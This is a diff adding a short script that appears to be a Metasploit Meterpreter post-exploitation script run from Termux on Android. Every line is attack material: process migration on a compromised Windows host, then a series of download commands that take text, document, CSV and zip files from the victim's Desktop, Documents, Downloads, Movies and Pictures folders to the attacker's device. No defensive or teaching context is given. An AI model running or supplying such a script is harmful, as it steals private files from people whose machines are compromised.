@@ -1,0 +1,17 @@
+getpid
+run post/windows/manage/migrate
+cd ..
+cd ..
+cd ..
+cd ..
+download -f Desktop/*.txt? -r /data/data/com.termux/files/home/msf/download/
+download -f Desktop/*.doc? -r /data/data/com.termux/files/home/msf/download/
+download -f Desktop/*.csv? -r /data/data/com.termux/files/home/msf/download/
+download -f Desktop/*.dash? -r /data/data/com.termux/files/home/msf/download/
+download -f Desktop/*.zip? -r /data/data/com.termux/files/home/msf/download/
+download -f Documents/*.txt? -r /data/data/com.termux/files/home/msf/download/
+download -f Documents/*.zip? -r /data/data/com.termux/files/home/msf/download/
+download -f Downloads/*txt? -r /data/data/com.termux/files/home/msf/download/
+download -f Movies/*.txt? -r /data/data/com.termux/files/home/msf/download/
+download -f Pictures/*.txt? -r /data/data/com.termux/files/home/msf/download/
+ps |grep explorer
